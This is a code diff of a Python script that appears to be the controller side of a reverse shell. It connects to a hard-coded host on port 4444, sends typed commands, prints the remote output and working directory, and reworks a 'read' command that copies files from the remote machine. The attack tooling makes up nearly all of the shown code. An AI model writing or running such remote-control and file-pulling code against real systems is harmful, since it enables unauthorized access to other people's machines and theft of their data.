@@ -2,7 +2,7 @@ import socket
 
 SERVER_HOST = "10.0.1.24" # desktop
 SERVER_PORT = 4444
-BUFFER_SIZE = 1024*128 # max size of messages
+BUFFER_SIZE = 1024 # max size of messages
 
 SEPARATOR = "<sep>"
 
@@ -30,29 +30,30 @@ while True:
     splitted_command = command.split()
     if not command.strip():
         continue
-    elif splitted_command[0].lower() == "read" :
-        print("Reading...")
-        respond = client_socket.recv(BUFFER_SIZE).decode()
-        print("Response recieved...")
-        if respond != "error" :
-            file_name = splitted_command[1]
-            file_data = b""
-            while True:
-                data = client_socket.recv(BUFFER_SIZE)
-                file_data += data
-                if data.endswith(b"end") :
-                    break
-            file_data = file_data[:len(file_data) - 3]
-            with open(file_name, "wb") as f:
-                f.write(file_data)
-            print("File {file_name} has been written.")
-        else :
-            print("File does not exist in this directory.")
 
     client_socket.send(command.encode())
     if command.lower() == "exit":
         break
-
+    elif splitted_command[0].lower() == "read" :
+        file_name = splitted_command[1]
+        
+        file_size = int(client_socket.recv(BUFFER_SIZE).decode())
+        print(file_size)
+        data = client_socket.recv(file_size)
+        with open(file_name, "wb") as f:
+            f.write(data)
+        """
+        with open(file_name, "wb") as f:
+            while True:
+                # read 1024 bytes from the socket (receive)
+                data = client_socket.recv(BUFFER_SIZE)
+                if not data:    
+                    # nothing is received
+                    # file transmitting is done
+                    break
+                # write to the file the bytes we just received
+                f.write(data)
+        """
     output = client_socket.recv(BUFFER_SIZE).decode()
     results, cwd = output.split(SEPARATOR)
     print(results)
